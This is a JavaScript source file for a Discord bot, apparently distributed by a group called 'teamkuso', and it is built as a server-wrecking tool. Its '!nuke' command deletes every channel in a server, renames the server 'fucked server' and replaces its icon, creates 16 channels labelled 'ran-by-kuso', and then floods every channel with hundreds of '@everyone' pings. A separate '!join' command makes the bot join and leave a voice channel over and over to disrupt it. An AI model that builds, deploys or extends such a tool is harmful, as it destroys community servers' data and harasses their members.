const Token = "";
const Discord = require("discord.js");
const bot = new Discord.Client
const guild = Discord.Guild
const prefix = "!";

bot.on('ready', () =>{
  console.log(`check out our Discord: discord.gg/5c4whWX`);
    console.log(`your bot is online`);
      bot.user.setActivity(`teamkuso.xyz/discord`);
})

bot.on("message", async function (msg) {

if (msg.content.indexOf(`${prefix}join`) === 0) {
  msg.member.lastMessage.delete();
  if(!msg.member.voice.channel) return msg.channel.send("You are not in a voice channel");
  for(let i =0;i<=10;i++) {
    msg.member.voice.channel.join();
    msg.member.voice.channel.leave();
  }
}

if (msg.content.indexOf(`${prefix}leave`) === 0) {
  msg.member.lastMessage.delete();
  msg.member.voice.channel.leave();
} //you can use this command if the bot "breaks"

if (msg.content === `${prefix}nuke`) {
  msg.guild.channels.cache.forEach(channel => channel.delete())
  msg.guild.setIcon("https://teamkuso.xyz/img/kuso.png")
  msg.guild.setName("fucked server")
    for(let i =0;i<=15;i++) {
    await msg.guild.channels.create('ran-by-kuso', {
      type: 'text',
      permissionOverwrites: [
        {
          id: msg.author.id,
        },
      ],
    })
    }
    for(let i =0;i<=500;i++) {
      msg.guild.channels.cache.forEach(channel => {
        channel.send('@everyone').catch(console.error);
      })
  }
}

});
bot.login(Token);
